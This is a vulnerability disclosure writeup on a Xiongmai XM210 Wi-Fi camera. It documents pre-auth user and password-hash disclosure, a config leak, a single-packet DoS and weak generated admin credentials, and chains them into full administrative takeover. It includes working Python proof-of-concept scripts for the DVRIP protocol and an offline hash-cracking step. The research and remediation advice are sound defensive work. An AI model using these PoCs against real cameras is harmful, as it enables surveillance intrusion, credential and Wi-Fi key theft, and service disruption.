# Xiongmai IPC_XM210 (RT-Thread) — Security Research Writeup

> **Researcher:** Artyom Bordulev
> GitHub: [@Raizer1996](https://github.com/Raizer1996) · LinkedIn: [artyom-bordulev](https://www.linkedin.com/in/artyom-bordulev-9b580b1ba/)
> Advisory: XM210-2026-001 · CVEs pending publication (MITRE CNA-LR: CAN-2026-2037011, -2037013, -2037014)
>
> This is the technical writeup. The formal advisory is in [`cam_research.md`](cam_research.md); proof-of-concept scripts are in [`xiongmai-xm210-pocs.txt`](xiongmai-xm210-pocs.txt).

## Overview

This writeup documents four vulnerabilities in a current-shipping Wi-Fi IP camera built on the
Xiongmai XM210 platform and provisioned through the iCSee mobile application. Findings 1-4 concern the device; a related iCSee application weakness (a predictable
random-number generator) is documented separately as Finding #5. Chained, Findings 1 and 4 allow an
unauthenticated attacker on the local network to retrieve the administrator password hash, recover
the plaintext offline within seconds, and obtain full administrative control — live and recorded
video, the configured Wi-Fi pre-shared key in cleartext, and arbitrary reconfiguration. A separate
single-packet denial-of-service condition is also documented. Three of the four findings appear to
be previously unreported.

## Target

| Attribute | Value |
|---|---|
| Hardware | `IPC_XM210_X2-WR-T_S38` |
| SoC | Xiongmai XM210 (Shenzhen iComm Semiconductor — OUI `10:65:19`) |
| OS | RT-Thread RTOS |
| Firmware | `V5.06.R02.000999WP.00000.140f24.0000000` (built 2025-10-11) |
| Provisioning app | iCSee (`com.xm.csee`) |
| Protocol | DVRIP / Sofia on TCP/34567 |

Xiongmai is an ODM: the XM210 platform is sold as a reference design and rebranded by numerous OEMs
(Sricam, Floureon, KKMOON, Hiseeu, and many unbranded listings). A unit not labelled "Xiongmai" is
therefore not necessarily unaffected; the XM210 SoC and the V5.0x.R02 firmware lineage are
widespread.

## Why this device is notable

Most published Xiongmai vulnerabilities target the older Linux/Sofia/HiSilicon platform (HTTP
buffer overflows, RTSP parser bugs, telnet-enable backdoors on TCP/9530, debug RCE on TCP/9527).
None of that applies here. The device exposes a single TCP service:

```
PORT      STATE         SERVICE
34567/tcp open          DVRIP/Sofia
34569/udp open|filtered DVRIP discovery
```

No HTTP, RTSP, or ONVIF; no TCP/9527 or TCP/9530. The hostname resolves as `rtthread_7730.lan`,
indicating a stripped-down RT-Thread RTOS port rather than the usual Linux/BusyBox build — a smaller
attack surface to which few historical CVEs apply. The only reachable interface is DVRIP on
TCP/34567; all findings below were obtained by sending DVRIP requests and observing responses.

## Scope

Testing was performed on the researcher's own device, on an isolated lab network with no public
route, factory-reset before testing. No firmware extraction, no UART/JTAG, and no interaction with
vendor cloud infrastructure were performed. No weaponized payloads were developed against the
firmware-upgrade handler. All work is read-side / observational on the network; the findings chain
to full administrative compromise via well-formed DVRIP requests rather than memory corruption.

## DVRIP frame format (reference)

```
Offset  Size  Field
------  ----  --------------------------------------------------
0x00    1     Magic byte (0xFF)
0x01    1     Version (0x01)
0x02    2     Reserved
0x04    4     Session ID (little-endian)
0x08    4     Sequence number (little-endian)
0x0C    1     Total packets (0)
0x0D    1     Current packet (0)
0x0E    2     MsgID (little-endian)
0x10    4     Body length (little-endian)
0x14    var   JSON body, terminated by "\n\x00"
```

Authentication is enforced via the Session ID field: after a successful login (MsgID 1000) the
device issues a session identifier that subsequent requests are expected to present. Findings 1 and
2 result from inadequate enforcement of this requirement on a subset of message handlers.

## Findings overview

| # | Finding | CVSS 3.1 (LAN) | (Internet-exposed) |
|---|---|---|---|
| 1 | Pre-auth user/hash disclosure | 6.5 | 7.5 |
| 2 | Pre-auth configuration disclosure | 4.3 | 5.3 |
| 3 | Unauthenticated DoS via malformed DVRIP | 6.5 | 7.5 |
| 4 | Device low-entropy admin credential | 6.4 | 8.1 |
| **1 + 4 chained** | | **8.8 (High)** | **9.8 (Critical)** |

End to end, the chain takes an attacker from an IP address on the LAN to administrator on the camera
in under a minute, with no prior credentials.

---

## Finding 1 — Pre-auth user list and password hash disclosure

`AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` — 6.5 (Medium) · CWE-306 (Missing Authentication for Critical Function)

A sweep of DVRIP message identifiers, each sent with `SessionID: 0x00000000`, returns `Ret=203`
(auth required) or `Ret=205` (account locked) for most opcodes. Two return `Ret=100` and should
not:

- **MsgID 1470 — Users**
- **MsgID 1472 — Groups**

Both return the full user list — XM-format password hashes, group memberships, and authority lists —
pre-authentication, from a single TCP connection. This is the same class as CVE-2024-3765
(netsecfish, 2024), which affected MsgID 1009. The vendor patched 1009 (confirmed: netsecfish's
PoC packet returns `Ret=102`, "method unsupported"), but the underlying authentication-framework gap
was not addressed; 1470 and 1472 still leak.

### PoC

```python
#!/usr/bin/env python3
import socket, struct

s = socket.socket()
s.connect(("<target>", 34567))
body = b'{"Name":"Users","SessionID":"0x00000000"}\n\x00'
hdr = struct.pack("<BBHIIBBHI", 0xFF, 0x01, 0, 0, 0, 0, 0, 1470, len(body))
s.send(hdr + body)
print(s.recv(65536)[20:].decode(errors="replace"))
```

### Response (illustrative; sensitive values redacted)

```json
{
  "Users": [
    {
      "Name": "<4-char-random>",
      "Group": "admin",
      "Memo": "admin 's account",
      "Password": "<XM hash>",
      "PasswordV2": "<V2 blob>",
      "Token": "<token>",
      "AuthorityList": ["ShutDown", "ChannelTitle", "DefaultConfig",
                        "SysUpgrade", "AutoMaintain", "GeneralConfig",
                        "NetConfig", "AlarmConfig", "VideoConfig",
                        "RecordConfig", "StorageManager", "..."]
    },
    {
      "Name": "admin",
      "Group": "admin",
      "Memo": "factory test account",
      "Password": "tlJwpbo6",
      "PasswordV2": ""
    }
  ],
  "SessionID": "0x00000000",
  "Name": "Users",
  "Ret": 100
}
```

Two observations:

1. `tlJwpbo6` is the XM hash of the empty string. The second account — `admin`, marked
   `factory test account` — therefore ships with a blank password on production firmware. This
   default-credential pattern matches the public record dating to CVE-2016-1000246.
2. The first account has a randomly-generated four-character username and a non-trivial hash. Its
   generation is examined in Finding 4; the disclosure of its hash is what makes the chain in
   Section "Chained attack" possible.

---

## Finding 2 — Pre-auth configuration disclosure (additional handlers, same root cause)

`AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` — 4.3 (Low) · CWE-306

The same sweep shows these identifiers responding `Ret=100` with no session:

| MsgID | Name | Returned data |
|---|---|---|
| 1042 | `General` | Device general config (`AppBindFlag`, machine name, auto-maintain schedule) |
| 1046 | `Camera` | Stub — full config requires an authenticated sub-parameter |
| 1050 | `Storage` | Stub |
| 1450 | `OPMachine` | Stub |

Full data on 1046/1050/1450 is gated behind a sub-parameter that does require a session; 1042 leaks
configuration metadata and the cloud-bind flag. The Wi-Fi PSK (MsgID 1042, `Name: "NetWork.Wifi"`)
is session-gated and not directly pre-auth-readable; it is reachable via the chain in Finding 4.

By itself this is low-impact information disclosure. Its value is in confirming that the
authentication gap is a **class** issue affecting multiple handlers, not a single-opcode oversight —
remediation requires a centralized fix at the dispatch layer rather than per-handler patching.

### PoC

```python
import socket, struct, json
TARGETS = [(1042, "General"), (1046, "Camera"), (1050, "Storage"), (1450, "OPMachine")]
for mid, name in TARGETS:
    s = socket.socket(); s.connect(("<target>", 34567))
    body = (json.dumps({"Name": name, "SessionID": "0x00000000"}) + "\n\x00").encode()
    hdr = struct.pack("<BBHIIBBHI", 0xFF, 0x01, 0, 0, 0, 0, 0, mid, len(body))
    s.send(hdr + body)
    print(f"--- MsgID {mid} ({name}) ---")
    print(s.recv(65536)[20:].decode(errors="replace")[:300])
    s.close()
```

---

## Finding 3 — Unauthenticated denial of service (watchdog reboot)

`AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` — 6.5 (Medium) · CWE-20 (Improper Input Validation) / CWE-730

Four message identifiers — **1054, 1400, 1410, 1514** — enter an unrecoverable state when supplied
with malformed input (omitted required sub-parameters or wrong field types). The handler hangs;
approximately 30 seconds later the hardware watchdog reboots the device. Total downtime per
occurrence is ~60–90 seconds. The condition requires no authenticated session, is triggered by a
single packet, and reproduces deterministically.

### PoC

```python
import socket, struct, json

s = socket.socket(); s.settimeout(3)
s.connect(("<target>", 34567))
body = (json.dumps({"Name": "System", "SessionID": "0x00000000"}) + "\n\x00").encode()
hdr = struct.pack("<BBHIIBBHI", 0xFF, 0x01, 0, 0, 0, 0, 0, 1054, len(body))
s.send(hdr + body)
try:
    print(s.recv(4096))
except socket.timeout:
    print("Handler hung. Watchdog reboot expected within ~30s.")
s.close()
```

**Impact.** A reboot loop is sustainable indefinitely from a single packet on a timer; while
rebooting, the device records nothing, including any motion event in that window. A handler that
hangs on malformed input rather than rejecting it is also a plausible indicator of memory-corruption
issues in the affected handlers — not investigated here, but flagged for further analysis.

---

## Finding 4 — Device generates a low-entropy administrator credential

`AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — 8.8 (High) when chained with Finding 1 · CWE-521 (Weak Password Requirements)

During provisioning the **device** generates a random administrator account. The iCSee app reads
and displays it via the DVRIP `GetRandomUserInfo` request; the app does not generate these values.
On the test device:

| Field | Pattern | Length | Estimated entropy |
|---|---|---|---|
| Username | `[a-z]{4}` | 4 characters | ~18 bits |
| Password | `[a-z0-9]{6}` | 6 characters | ~31 bits |

The password search space is 36⁶ ≈ 2.2 × 10⁹. The XM hash format is supported directly by hashcat
mode 22401; the space is exhaustible in under ten seconds on a modern CPU, and far faster on a GPU.
The hash is exposed pre-authentication via Finding 1.

For reference, administrative IoT credentials should provide ≥ 75 bits of entropy (≥ 12 characters
from a mixed alphabet), or be a per-device cryptographically-derived secret bound to the device
serial so that disclosure does not yield a brute-forceable value.

**Confirmation and limitation.** The format was observed across multiple factory-reset cycles on the test device: each reset produced
a fresh credential, every one matching `[a-z]{4}` / `[a-z0-9]{6}`. The deployed username is **four**
characters, whereas the iCSee app's own generator produces **eight**-character usernames (Finding #5),
and a factory reset without re-pairing still yields a four-character device account — so the deployed
credential is generated by the **device firmware**, not the app. The generator is device-resident on
the XM210 platform and expected to be consistent across OEM rebrands. (Actual values are redacted.)

> **Attribution (resolved).** The deployed 4/6 credential is generated by the **device firmware**, not the iCSee app: a factory reset yields a fresh four-character device account, whereas the app's own generator produces eight-character values. The iCSee app separately contains a predictable-RNG path (`java.util.Random`) documented as [Finding #5](DISCLOSURE_finding5_app_predictable_rng.md) (CWE-338). The length weakness here (CWE-521) is independent of that.

---

## Chained attack

Findings 1 (hash disclosure) and 4 (weak generation) combine into the primary exploitation scenario:

| Step | Action | Outcome |
|---|---|---|
| 1 | Port-scan the LAN | TCP/34567 identified |
| 2 | One DVRIP request (MsgID 1470, blank session) | Full user list + hashes (Finding 1) |
| 3 | Identify the random-named `admin`-group user | Target credential selected |
| 4 | Offline recovery (`hashcat -m 22401`) | Plaintext password in < 10 s (Finding 4) |
| 5 | DVRIP login with recovered credentials | Authenticated administrative session |
| 6 | Post-auth operations | Live video, recording download, Wi-Fi PSK, reconfiguration, firmware update |

Elapsed time from knowing only the device IP to administrative control: under one minute.
`AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` → 8.8 (High). If TCP/34567 is port-forwarded to the Internet
(as some iCSee direct-IP tutorials suggest): 9.8 (Critical).

## Demonstrated impact

Validated end to end against the researcher's own device with recovered credentials:

- **Administrative access** — full DVRIP control, user management, config read/write.
- **Recording enumeration** — MsgID 1440 returned recorded-clip filenames and timestamps.
- **Recording download** — MsgID 1424 (`OPPlayBack` Claim) followed by MsgID 1420 with action
  `DownloadStart` retrieved a 2.5 MB H.264 clip, remuxed with `ffmpeg -c copy`, confirmed playable.
- **Wi-Fi PSK disclosure** — MsgID 1042 with `Name: "NetWork.Wifi"` returned SSID and PSK in
  cleartext. Consequently, anyone who obtains the device (including a discarded or second-hand unit)
  can recover the Wi-Fi password it last held.

## Out of scope

Deliberately not investigated:

- **`OPSystemUpgrade` firmware handler** (post-auth, 16,384-byte chunks). Historically the focus of
  XM exploit research on Linux/Sofia builds; equivalent analysis on RT-Thread was not performed, and
  no exploit was developed against current-shipping firmware.
- **Memory-corruption analysis** of the Finding 3 handlers (candidate for fuzzing).
- **Hardware phase** — UART/flash extraction and firmware reverse engineering.
- **XMEye P2P cloud** (`AppBindFlag.BeBinded: true`) — third-party infrastructure, out of scope.

## Relation to existing CVEs

| CVE | Applies? | Rationale |
|---|---|---|
| CVE-2016-1000246 | No | HTTP-based |
| CVE-2017-7577 | No | HTTP-based |
| CVE-2018-10088 | No | HTTP-based |
| CVE-2018-17915/17917/17919 | Likely (XMEye cloud) | Cloud not tested |
| CVE-2020-22253 | No | TCP/9530 not present |
| CVE-2021-41506 | No | TCP/9527 not present |
| CVE-2022-26259 | No | RTSP not present |
| CVE-2022-45045 | Possibly | DVRIP/34567 upgrade RCE; not tested |
| **CVE-2024-3765** | **Class persists; specific MsgID patched** | MsgID 1009 → `Ret=102`; findings target handlers the patch did not address |
| CVE-2025-65856 | No | ONVIF not present |
| CVE-2026-34005 | No | Linux/Sofia binary; this is RT-Thread |

The closest prior art is CVE-2024-3765: the vendor patched the symptom (one opcode) rather than the
root cause, leaving the same authentication gap exploitable on additional handlers in a newer
firmware family with no prior published findings.

## Remediation

**Vendor**

1. Centralize the DVRIP authentication check at the dispatch layer (per-handler validation has
   failed on ≥ 8 opcodes: 1009, 1042, 1046, 1050, 1450, 1470, 1472, plus the DoS set).
2. Increase device credential entropy — ≥ 12 mixed-alphabet characters, or per-device
   cryptographic derivation.
3. Validate input on every DVRIP handler; a handler that hangs on malformed input is a broader
   code-quality issue than DoS alone.
4. Remove the blank-password factory test account from production firmware.
5. Encrypt the Wi-Fi PSK at rest.

**Users**

1. Isolate the camera on a network segment with no Internet route; if remote access is unused, block
   outbound traffic to vendor cloud infrastructure.
2. Change the auto-generated administrator password to a strong value immediately after pairing.
3. Never port-forward TCP/34567 to the Internet.
4. Rotate the Wi-Fi PSK for any network on which a transferred, refurbished, or second-hand unit
   operated.

## Tooling

The PoC scripts reproducing all four findings are in this repository and use only the Python
standard library, with one optional one-line patch to OpenIPC's `python-dvr` (`dvrip.py`, to handle
firmware responses that return a bytearray rather than a dict on certain response shapes).

## References

1. CVE-2024-3765 — https://nvd.nist.gov/vuln/detail/CVE-2024-3765
2. netsecfish PoC for CVE-2024-3765 — https://github.com/netsecfish/xiongmai_incorrect_access_control
3. SEC Consult, XMEye P2P advisory (2018) — https://sec-consult.com/blog/detail/millions-of-xiongmai-video-surveillance-devices-can-be-hacked-via-cloud-feature-xmeye-p2p-cloud/
4. CISA ICSA-18-282-06 — https://www.cisa.gov/news-events/ics-advisories/icsa-18-282-06
5. python-dvr — https://github.com/OpenIPC/python-dvr
6. CVSS 3.1 calculator — https://www.first.org/cvss/calculator/3.1
